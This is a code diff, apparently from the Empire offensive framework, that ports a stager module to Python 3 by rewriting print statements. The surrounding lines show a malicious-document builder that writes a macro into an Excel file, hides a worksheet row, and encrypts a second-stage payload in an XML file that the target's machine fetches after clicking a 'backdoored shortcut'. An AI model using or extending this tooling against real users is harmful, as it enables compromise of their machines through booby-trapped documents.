@@ -1,3 +1,4 @@
+from __future__ import print_function
 import random, string, xlrd, datetime
 from xlutils.copy import copy
 from xlwt import Workbook, Utils
@@ -147,7 +148,7 @@ class Stager:
 	launcher = launcher.replace("\"","'")
 	
         if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+            print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
 	    try:
@@ -226,9 +227,9 @@ class Stager:
 	    macro += "next " + fileVar + "\n"
 	    macro += "End Sub\n"
 	    activeSheet.row(inputRow).hidden = True 
-	    print helpers.color("\nWriting xls...\n", color="blue")
+	    print(helpers.color("\nWriting xls...\n", color="blue"))
 	    workBook.save(xlsOut)
-	    print helpers.color("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n", color="green")
+	    print(helpers.color("xls written to " + xlsOut + "  please remember to add macro code to xls prior to use\n\n", color="green"))
 
 
 	    #encrypt the second stage code that will be dropped into the XML - this is the full empire stager that gets pulled once the user clicks on the backdoored shortcut
@@ -248,13 +249,13 @@ class Stager:
 	    cipher_text = helpers.encode_base64(ivBuf+cipher_text)
 
 	    #write XML to disk
-	    print helpers.color("Writing xml...\n", color="blue")
+	    print(helpers.color("Writing xml...\n", color="blue"))
 	    fileWrite = open(XmlOut,"w")
 	    fileWrite.write("<?xml version=\"1.0\"?>\n")
 	    fileWrite.write("<main>")
 	    fileWrite.write(cipher_text)
 	    fileWrite.write("</main>\n")
 	    fileWrite.close()
-	    print helpers.color("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n", color="green")
+	    print(helpers.color("xml written to " + XmlOut + " please remember this file must be accessible by the target at this url: " + XmlPath + "\n", color="green"))
 
             return macro
